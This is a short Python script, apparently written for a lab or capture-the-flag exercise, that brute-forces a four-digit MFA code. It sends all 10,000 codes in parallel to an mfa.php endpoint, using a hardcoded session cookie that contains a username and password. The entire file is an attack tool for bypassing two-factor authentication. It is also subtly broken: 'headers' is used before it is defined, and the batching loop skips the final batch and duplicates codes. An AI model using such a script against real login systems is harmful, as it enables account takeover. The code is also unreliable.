import requests
from requests.structures import CaseInsensitiveDict 
import urllib3
import multiprocessing
from multiprocessing import Pool
urllib3.disable_warnings()

thread = 40 #How many threads you want
url = "http://[URL]/mfa.php" #Url of the thing you want
headers['Cookie'] = "PHPSESSID=sseip499gi5l6t48p90nip6dl2; pwd=violet; user=jason_test_account" #Cookie because I don't know sessions yet
lis = []
headers = CaseInsensitiveDict()
i = 0
j = 0


def posting(code):
    # print(f'Attempting... {cred}')
    print(f"Code: {code}")
    r = requests.post(url, headers=headers, data=code)
    # print(f"Length: {len(r.text)}") #Debug check if it works or not
    # if len(r.text) != 1523:
        # print("Error or Found")
    if not 'Incorrect code' in r.text:
        print(f"***********Login Found  {code}***********")
        exit()

while i < 10000:
    if j < thread:
        if i < 1000:
            code = ("000" + str(i))[-4:]
        else:
            code = str(i)
        code = dict(code=code)
        lis.append(code)
        j += 1
        i += 1
        continue
    else:
        j = 0
        pool=Pool(processes=thread)
        che = pool.map(posting,lis)
        lis = []
        lis.append(code)